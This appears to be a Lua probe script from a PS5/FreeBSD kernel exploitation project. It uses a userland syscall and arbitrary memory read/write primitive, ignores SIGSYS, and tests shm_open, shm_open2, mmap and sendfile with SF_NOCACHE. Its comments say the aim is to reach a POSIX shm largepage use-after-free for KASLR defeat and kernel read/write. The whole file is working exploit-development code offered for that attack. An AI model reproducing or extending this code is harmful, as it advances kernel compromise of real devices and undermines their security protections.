-- CRASH_CLASS: MODERATE
-- PROBE 391a: Retest shm_open(482) with SIGSYS ignored + real arguments
--
-- Context: ATTACK_SURFACE.md says shm_open(482) "crashes loader" but that
-- was tested WITHOUT ignoring SIGSYS. nosys stubs raise signal 12, whose
-- default action terminates. With sigaction(12, SIG_IGN), absent slots
-- return -1 instead of dying (353a/353b).
--
-- CVE-2026-49427/49428: POSIX shm largepage UAF. If shm_open works,
-- we can test sendfile(SF_NOCACHE) or open(O_TRUNC) to trigger the UAF.
-- This is our #1 lead for KASLR defeat + kernel R/W in one primitive.
--
-- Plan:
-- [A] Ignore SIGSYS, test shm_open(482) with zero args (presence check)
-- [B] shm_open with real args: name="/test", O_CREAT|O_RDWR, mode=0600
-- [C] shm_open2(571) with flags parameter (newer API)
-- [D] shm_unlink(483) presence check
-- [E] If any fd obtained: ftruncate + mmap + test largepage support
-- [F] sendfile(393) presence retest with a real fd pair

print("=== PROBE 391a: shm_open retest + posixshm exploration ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- ===================================================================
-- [A] Ignore SIGSYS (signal 12) so nosys stubs return -1 instead of killing
-- ===================================================================
print("[A] ignore SIGSYS")

-- sigaction(416): sigaction(signum, act, oldact)
-- act struct: sa_handler at +0, sa_flags at +8, sa_mask at +16
-- SIG_IGN = 1
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))  -- sa_handler = SIG_IGN (1)

local sc_sigaction = mk(416)
local sig_ret = -999
local ok_sig, rv_sig = pcall(function()
    return sc_sigaction(uint64(12), act, uint64(0))  -- signal 12 = SIGSYS
end)
if ok_sig then sig_ret = N(rv_sig) end
print("  sigaction(12, SIG_IGN): ret=" .. sig_ret)

if not alive() then print("DEAD after sigaction"); return end
print("")

-- ===================================================================
-- [B] shm_open(482) with zero args — presence check
-- ===================================================================
print("[B] shm_open(482) presence check")

local sc_shm_open = mk(482)

-- First: six zeros (like the sysent sweep does)
local ret_zero = -999
local ok_z, rv_z = pcall(function()
    return sc_shm_open(uint64(0), uint64(0), uint64(0))
end)
if ok_z then ret_zero = N(rv_z) end
print("  shm_open(0,0,0): ret=" .. ret_zero)

if not alive() then
    print("  DEAD — shm_open kills even with SIGSYS ignored (not nosys, real fault)")
    return
end

-- ===================================================================
-- [C] shm_open with real arguments
-- ===================================================================
print("[C] shm_open with real args")

-- O_CREAT = 0x200, O_RDWR = 0x2, O_CREAT|O_RDWR = 0x202
-- Mode 0600 = 384 decimal
local name_buf = memory.alloc(32)
zero_buf(name_buf, 32)
-- Write "/test\0" into name_buf
local name_str = "/test"
for i = 1, #name_str do
    local byte_val = string.byte(name_str, i)
    -- write_dword won't work for single bytes cleanly, use a dword approach
    -- "/tes" = 0x7365742F, "t\0" at +4
end
-- Actually write dword-aligned: "/tes" then "t\0\0\0"
wd(N(name_buf), 0x7365742F)      -- "/tes" little-endian
wd(N(name_buf) + 4, 0x00000074)  -- "t\0\0\0"

-- Verify the name is correct
local check = rd(N(name_buf))
print(string.format("  name check: 0x%X (expect 0x7365742F)", check or 0))

local ret_real = -999
local ok_r, rv_r = pcall(function()
    return sc_shm_open(name_buf, uint64(0x202), uint64(0x180))  -- O_CREAT|O_RDWR, 0600
end)
if ok_r then ret_real = N(rv_r) end
print("  shm_open(\"/test\", O_CREAT|O_RDWR, 0600): ret=" .. ret_real)

if not alive() then print("DEAD after shm_open real"); return end

-- Try with O_RDWR only (no create) in case something already exists
local ret_rdwr = -999
local ok_rw, rv_rw = pcall(function()
    return sc_shm_open(name_buf, uint64(0x2), uint64(0x180))  -- O_RDWR only
end)
if ok_rw then ret_rdwr = N(rv_rw) end
print("  shm_open(\"/test\", O_RDWR, 0600): ret=" .. ret_rdwr)

if not alive() then print("DEAD after shm_open O_RDWR"); return end

-- Try SHM_ANON (special value, typically (char*)1)
local ret_anon = -999
local ok_a, rv_a = pcall(function()
    return sc_shm_open(uint64(1), uint64(0x202), uint64(0x180))  -- SHM_ANON, O_CREAT|O_RDWR
end)
if ok_a then ret_anon = N(rv_a) end
print("  shm_open(SHM_ANON, O_CREAT|O_RDWR, 0600): ret=" .. ret_anon)

if not alive() then print("DEAD after SHM_ANON"); return end
print("")

-- ===================================================================
-- [D] shm_open2(571) — newer API with flags parameter
-- ===================================================================
print("[D] shm_open2(571)")

-- shm_open2(path, flags, mode, shmflags, fcaps)
-- SHM_LARGEPAGE = 0x200 (FreeBSD 13+)
local sc_shm_open2 = mk(571)

-- First: presence check with zeros
local ret_571z = -999
local ok_571z, rv_571z = pcall(function()
    return sc_shm_open2(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if ok_571z then ret_571z = N(rv_571z) end
print("  shm_open2(0,0,0,0,0): ret=" .. ret_571z)

if not alive() then print("DEAD after shm_open2 zeros"); return end

-- With real args: SHM_ANON + O_CREAT|O_RDWR
local ret_571r = -999
local ok_571r, rv_571r = pcall(function()
    return sc_shm_open2(uint64(1), uint64(0x202), uint64(0x180), uint64(0), uint64(0))
end)
if ok_571r then ret_571r = N(rv_571r) end
print("  shm_open2(SHM_ANON, O_CREAT|O_RDWR, 0600, 0, 0): ret=" .. ret_571r)

if not alive() then print("DEAD after shm_open2 real"); return end

-- With SHM_LARGEPAGE flag (0x200)
local ret_571lp = -999
local ok_571lp, rv_571lp = pcall(function()
    return sc_shm_open2(uint64(1), uint64(0x202), uint64(0x180), uint64(0x200), uint64(0))
end)
if ok_571lp then ret_571lp = N(rv_571lp) end
print("  shm_open2(SHM_ANON, O_CREAT|O_RDWR, 0600, SHM_LARGEPAGE, 0): ret=" .. ret_571lp)

if not alive() then print("DEAD after SHM_LARGEPAGE"); return end

-- Try SHM_GROW_ON_WRITE (0x100) — another shm_open2 flag
local ret_571gw = -999
local ok_571gw, rv_571gw = pcall(function()
    return sc_shm_open2(uint64(1), uint64(0x202), uint64(0x180), uint64(0x100), uint64(0))
end)
if ok_571gw then ret_571gw = N(rv_571gw) end
print("  shm_open2(SHM_ANON, ..., SHM_GROW_ON_WRITE, 0): ret=" .. ret_571gw)

if not alive() then print("DEAD after GROW_ON_WRITE"); return end
print("")

-- ===================================================================
-- [E] shm_unlink(483) presence check
-- ===================================================================
print("[E] shm_unlink(483)")

local sc_shm_unlink = mk(483)

local ret_unlink = -999
local ok_u, rv_u = pcall(function()
    return sc_shm_unlink(name_buf)  -- "/test"
end)
if ok_u then ret_unlink = N(rv_u) end
print("  shm_unlink(\"/test\"): ret=" .. ret_unlink)

if not alive() then print("DEAD after shm_unlink"); return end
print("")

-- ===================================================================
-- [F] If we got any shm fd, test ftruncate + mmap
-- ===================================================================
print("[F] fd exploration")

-- Collect any positive return values as potential fds
local shm_fds = {}
for _, info in ipairs({
    {ret_real, "shm_open named"},
    {ret_anon, "shm_open SHM_ANON"},
    {ret_571r, "shm_open2 basic"},
    {ret_571lp, "shm_open2 LARGEPAGE"},
    {ret_571gw, "shm_open2 GROW_ON_WRITE"},
}) do
    local r = info[1]
    if r >= 0 and r < 0x10000 then
        shm_fds[#shm_fds + 1] = {fd = r, src = info[2]}
        print("  GOT FD " .. r .. " from " .. info[2] .. " !!!")
    end
end

if #shm_fds == 0 then
    print("  no shm fds obtained")
    print("")

    -- Fallback: check if these are nosys vs real handler
    -- sys 624 VM counter trick: call shm_open, check if VM ops changed
    print("[G] sys 624 VM counter diagnostic")
    local sc_624 = mk(624)
    local pre = -999
    local ok_pre, rv_pre = pcall(function() return sc_624(uint64(0)) end)
    if ok_pre then pre = N(rv_pre) end

    -- Call shm_open again
    pcall(function() sc_shm_open(name_buf, uint64(0x202), uint64(0x180)) end)

    local post = -999
    local ok_post, rv_post = pcall(function() return sc_624(uint64(0)) end)
    if ok_post then post = N(rv_post) end

    local delta = post - pre
    print(string.format("  624 pre=%d post=%d delta=%d", pre, post, delta))
    print("  (delta>0 means shm_open did VM work = real handler, not nosys)")
    print("")
else
    -- We have shm fds! Test ftruncate and mmap
    local best_fd = shm_fds[1].fd
    print(string.format("  using fd %d from %s", best_fd, shm_fds[1].src))

    -- ftruncate(480): ftruncate(fd, length)
    local sc_ftrunc = mk(480)
    local PAGE_SIZE = 0x4000  -- 16KB on PS5

    -- Try setting size to one page
    local ret_ft = -999
    local ok_ft, rv_ft = pcall(function()
        return sc_ftrunc(uint64(best_fd), uint64(PAGE_SIZE))
    end)
    if ok_ft then ret_ft = N(rv_ft) end
    print(string.format("  ftruncate(%d, 0x%X): ret=%d", best_fd, PAGE_SIZE, ret_ft))

    if not alive() then print("DEAD after ftruncate"); return end

    -- mmap the shm fd
    local sc_mmap = mk(477)
    local ret_mmap = nil
    local ok_mm, rv_mm = pcall(function()
        return sc_mmap(
            uint64(0),             -- addr (let kernel choose)
            uint64(PAGE_SIZE),     -- length
            uint64(3),             -- PROT_READ|PROT_WRITE
            uint64(1),             -- MAP_SHARED
            uint64(best_fd),       -- fd
            uint64(0)              -- offset
        )
    end)
    if ok_mm then
        local h, l = get_hi_lo(rv_mm)
        if h == 0xFFFFFFFF and l == 0xFFFFFFFF then
            print("  mmap: MAP_FAILED")
        else
            ret_mmap = rv_mm
            print(string.format("  mmap: 0x%X%08X *** SHM MAPPING OK ***", h, l))
        end
    else
        print("  mmap: CRASHED")
    end

    if not alive() then print("DEAD after mmap"); return end

    -- If mmap worked, try read/write
    if ret_mmap then
        local map_addr = N(ret_mmap)
        -- Write a marker
        wd(map_addr, 0xDEADBEEF)
        local readback = rd(map_addr)
        print(string.format("  write 0xDEADBEEF, read 0x%X — %s",
            readback or 0, readback == 0xDEADBEEF and "OK" or "MISMATCH"))

        -- Try larger size for largepage testing
        -- MAP_ALIGNED_SUPER = 0x01000000 (FreeBSD)
        local LARGE_SIZE = 0x200000  -- 2MB (typical superpage)
        local ret_ft2 = -999
        local ok_ft2, rv_ft2 = pcall(function()
            return sc_ftrunc(uint64(best_fd), uint64(LARGE_SIZE))
        end)
        if ok_ft2 then ret_ft2 = N(rv_ft2) end
        print(string.format("  ftruncate(%d, 0x%X): ret=%d", best_fd, LARGE_SIZE, ret_ft2))

        if ret_ft2 == 0 then
            -- Try MAP_ALIGNED_SUPER
            local ok_lm, rv_lm = pcall(function()
                return sc_mmap(
                    uint64(0),
                    uint64(LARGE_SIZE),
                    uint64(3),              -- PROT_READ|PROT_WRITE
                    uint64(0x01000001),     -- MAP_SHARED | MAP_ALIGNED_SUPER
                    uint64(best_fd),
                    uint64(0)
                )
            end)
            if ok_lm then
                local h2, l2 = get_hi_lo(rv_lm)
                if h2 == 0xFFFFFFFF and l2 == 0xFFFFFFFF then
                    print("  largepage mmap: MAP_FAILED")
                else
                    print(string.format("  largepage mmap: 0x%X%08X *** LARGEPAGE OK ***", h2, l2))
                end
            else
                print("  largepage mmap: CRASHED")
            end
        end
    end

    if not alive() then print("DEAD after mmap tests"); return end
    print("")

    -- ===================================================================
    -- [H] sendfile(393) with shm fd as source
    -- ===================================================================
    print("[H] sendfile test")

    -- Create a socket pair for sendfile destination
    local sc_socketpair = mk(135)
    local sv = memory.alloc(16)
    zero_buf(sv, 16)
    local ret_sp = -999
    local ok_sp, rv_sp = pcall(function()
        -- AF_UNIX=1, SOCK_STREAM=1, protocol=0
        return sc_socketpair(uint64(1), uint64(1), uint64(0), sv)
    end)
    if ok_sp then ret_sp = N(rv_sp) end
    local fd_r = rd(N(sv))
    local fd_w = rd(N(sv) + 4)
    print(string.format("  socketpair: ret=%d fds=%d,%d", ret_sp, fd_r or -1, fd_w or -1))

    if ret_sp == 0 and fd_w and fd_w > 0 then
        -- sendfile(393): sendfile(fd_out, fd_in, offset, nbytes, hdtr, sbytes, flags)
        -- SF_NOCACHE = 0x10
        local sc_sendfile = mk(393)
        local sbytes = memory.alloc(8)
        zero_buf(sbytes, 8)

        local ret_sf = -999
        local ok_sf, rv_sf = pcall(function()
            return sc_sendfile(
                uint64(best_fd),      -- fd_in: shm fd
                uint64(fd_w),         -- fd_out: socket
                uint64(0),            -- offset
                uint64(PAGE_SIZE),    -- nbytes
                uint64(0),            -- hdtr
                sbytes,               -- sbytes output
                uint64(0x10)          -- flags: SF_NOCACHE
            )
        end)
        if ok_sf then ret_sf = N(rv_sf) end
        local sent = rd(N(sbytes))
        print(string.format("  sendfile(shm->socket, SF_NOCACHE): ret=%d sbytes=%d",
            ret_sf, sent or 0))

        -- Also try without SF_NOCACHE for comparison
        local ret_sf2 = -999
        local ok_sf2, rv_sf2 = pcall(function()
            return sc_sendfile(
                uint64(best_fd),
                uint64(fd_w),
                uint64(0),
                uint64(PAGE_SIZE),
                uint64(0),
                sbytes,
                uint64(0)             -- flags: none
            )
        end)
        if ok_sf2 then ret_sf2 = N(rv_sf2) end
        local sent2 = rd(N(sbytes))
        print(string.format("  sendfile(shm->socket, no flags): ret=%d sbytes=%d",
            ret_sf2, sent2 or 0))
    end

    if not alive() then print("DEAD after sendfile"); return end

    -- Close the shm fd
    local sc_close = mk(6)
    pcall(function() sc_close(uint64(best_fd)) end)
    print("  closed shm fd " .. best_fd)
end

if not alive() then print("DEAD"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 391a COMPLETE ===")
